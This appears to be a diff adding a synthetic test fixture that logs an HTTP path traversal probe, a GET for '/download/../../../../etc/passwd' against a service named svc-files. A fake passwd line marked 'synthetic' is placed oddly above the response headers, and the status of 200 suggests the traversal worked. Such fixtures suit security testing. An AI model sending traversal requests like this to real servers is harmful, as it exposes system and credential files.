@@ -1,0 +1,13 @@
+== REQUEST ==
+GET /download/../../../../etc/passwd HTTP/1.1
+Host: svc-files:8008
+User-Agent: tanyin-b20-probe
+
+<html>GTTRAVERSAL-01 synthetic file: root:x:0:0:root</html>
+== RESPONSE ==
+status=200 latency_ms=None
+Server: BaseHTTP/0.6 Python/3.12.14
+Date: Wed, 07 Oct 2026 12:12:50 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 59
+
